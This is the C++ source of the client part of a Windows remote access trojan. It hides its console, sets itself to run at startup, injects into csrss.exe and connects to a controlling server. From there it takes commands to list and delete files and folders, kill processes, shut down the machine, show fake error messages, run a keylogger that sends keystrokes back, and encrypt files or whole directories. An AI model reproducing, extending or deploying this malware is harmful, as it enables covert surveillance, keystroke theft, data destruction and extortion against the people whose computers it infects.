/*
 * WARNING!
 * данное програмное обеспечение является полной собственностью автора
 * не предназначено для тупых школьников, в частности школоло - даунов
 * coded by govnocoder na poscale
 * FSB and FBR suck my dick bitch
 *
 * client part
*/


#include <winsock2.h>
#include <windows.h>
//#include <stdlib.h>
#include <fstream>
//#include <process.h>
//#include <limits.h>
#include <string>
//#include <cstdlib>

#include <vector>
#include <tlhelp32.h>

#include "Autorun.h"
#include "Config.h"
#include "Server.h"
#include "Crypt.h"
//#include "Utils.h"
#include "Keylogger.h"

//#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "ntdll.lib")
//#pragma comment(linker,"/BASE:0x13140000")

#pragma warning(disable: 4996)

using std::vector;

std::string readFile(const std::string fileName) {
	std::ifstream f(fileName);
	f.seekg(0, std::ios::end);
	size_t size = f.tellg();
	std::string s(size, ' ');
	f.seekg(0);
	f.read(&s[0], size);
	return s;
}

/*
std::wstring string_to_wstring(std::string& s) {
	std::ofstream ofs("temp.txt", std::ofstream::out);
	if (!ofs) exit(1);
	ofs << s;
	ofs.close();

	std::wstring s1;
	std::wifstream wifs("temp.txt", std::wifstream::in);
	if (!wifs) exit(1);
	wifs >> s1;
	wifs.close();
	system("del temp.txt");
	return s1;
}

std::string wstring_to_string(std::wstring s) {
	std::wofstream wofs("temp.txt", std::wofstream::out);
	if (!wofs) exit(1);
	wofs << s;
	wofs.close();

	std::string s1;
	std::ifstream ifs("temp.txt", std::ifstream::in);
	if (!ifs) exit(1);
	ifs >> s1;
	ifs.close();
	system("del temp.txt");
	return s1;
}

std::string readFile(const std::string fileName) {
	std::ifstream f(fileName);
	f.seekg(0, std::ios::end);
	size_t size = f.tellg();
	std::string s(size, ' ');
	f.seekg(0);
	f.read(&s[0], size);
	return s;
}

vector<std::string> scandir(std::string p) {
	std::wstring Path = string_to_wstring(p);

	WIN32_FIND_DATA FindFileData;
	HANDLE hf;

	hf = FindFirstFile((string_to_wstring(p)).c_str(), &FindFileData);

	vector<std::string> v;
	if (hf != INVALID_HANDLE_VALUE) {
		do {
			if (FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
				v.push_back(wstring_to_string(FindFileData.cFileName));
		} while (FindNextFile(hf, &FindFileData) != 0);
	}

	return v;
}
*/
DWORD GetProcessID(const char* lpNameProcess)
{
	HANDLE snap;
	PROCESSENTRY32 pentry32;
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) return 0;
	pentry32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(snap, &pentry32)) { CloseHandle(snap); return 0; }
	do {
		if (!lstrcmpi((LPCWSTR)lpNameProcess, &pentry32.szExeFile[0])) {
			CloseHandle(snap);
			return pentry32.th32ProcessID;
		}
	} while (Process32Next(snap, &pentry32));
	CloseHandle(snap);
	return 0;
}


std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars;


int Shell(SOCKADDR_IN addr) {
	char path[2048];
	SOCKET conn = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(conn, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
		return 1;
	}
	char buffer[256];
	while (true) {
		system("del file.txt");
		buf_file = "";
		loc_buf_file = "";
		memset(&buffer, 0x0, sizeof(buffer));
		recv(conn, buffer, sizeof(buffer), NULL);

		if (strcmp(buffer, "ls") == 0) {
			char path[1024];
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "dir " + std::string(path) + " > file.txt";
			system(comm.c_str());
			std::ifstream F;
			F.open("file.txt", std::ios::in);
			
			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file)*100, NULL);

		}

		else if (strcmp(buffer, "rm") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "del " + std::string(path);
			system(comm.c_str());
			std::string finally_msg = "delete " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg)*10, NULL);

		}

		else if (strcmp(buffer, "rmdir") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string comm = "RMDIR /S /Q " + std::string(path);
			system(comm.c_str());
			std::string finally_msg = "delete " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);

		}

		else if (strcmp(buffer, "pwd") == 0) {
			system("echo %cd% > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file)*100, NULL);
		}

		else if (strcmp(buffer, "sysinfo") == 0) {
			system("systeminfo > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);

			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
		}

		else if (strcmp(buffer, "ps") == 0) {
			system("tasklist > file.txt");
			std::ifstream F;
			F.open("file.txt", std::ios::in);
			while (getline(F, loc_buf_file)) {
				buf_file += loc_buf_file + '\n';
			}
			system("del file.txt");
			send(conn, buf_file.c_str(), sizeof(buf_file) * 220, NULL);
		}

		else if (strcmp(buffer, "kill") == 0) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			std::string com = "taskkill /T /F /IM " + std::string(path);
			system(com.c_str());
			std::string finally_msg = "terminate " + std::string(path) + " ok";
			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);

		}

		else if (!strcmp(buffer, "shutdown")) {
			system("shutdown /p");
		}

		else if (!strcmp(buffer, "error")) {
			memset(&path, 0x0, sizeof(path));
			recv(conn, path, sizeof(path), NULL);
			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
		}

		else if (!strcmp(buffer, "keylogger")) {
			memset(&path, 0x0, sizeof(path));
			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
			recv(conn, path, sizeof(path), NULL);
			while (buf.length() < unsigned int(atoi(path)+7) && rbuf.length() < unsigned int(atoi(path)+7)) {
				keylogger(keylog_path);
				buf = readFile(keylog_path + "keylog.txt");
				rbuf = readFile(keylog_path + "keylogru.txt");
			}
			key_ret = "\nen:\n" + buf + "\n\nru:\n" + rbuf;
			keydel = "del " + keylog_path + "keylog.txt";
			rkeydel = "del " + keylog_path + "keylogru.txt";
			system(keydel.c_str());
			system(rkeydel.c_str());
			send(conn, key_ret.c_str(), sizeof(key_ret) * 100, NULL);

			memset(&buf, 0x0, sizeof(buf));
			memset(&rbuf, 0x0, sizeof(rbuf));
		}

		else if (!strcmp(buffer, "cryptfile")) {
			char key[128];
			memset(&path, 0x0, sizeof(path));
			memset(&key, 0x0, sizeof(key));
			recv(conn, path, sizeof(path), NULL);
			recv(conn, key, sizeof(key), NULL);
			std::string res = CryptFile(path, atoi(key));
			send(conn, res.c_str(), sizeof(res) * 300, NULL);
		}

		else if (!strcmp(buffer, "cryptdir")) {
		char key[128];
		memset(&path, 0x0, sizeof(path));
		memset(&key, 0x0, sizeof(key));
		recv(conn, path, sizeof(path), NULL);
		recv(conn, key, sizeof(key), NULL);
		std::string res = CryptDir(path, atoi(key));
		send(conn, res.c_str(), sizeof(res) * 300, NULL);
		}

		else if (strcmp(buffer, "close") == 0) return 1; 
	}
	return 0;
}


int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	setlocale(LC_ALL, "Russian");
	// autorun
	RegisterProgram();
	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);

	HINSTANCE hKernel;
	int i = 1;
	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
	if (hKernel) {
		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
			GetProcAddress(hKernel, "RegisterServiceProcess");
	}
	SOCKADDR_IN add = Server();
	Shell(add);
	return 0;
}


// start kurva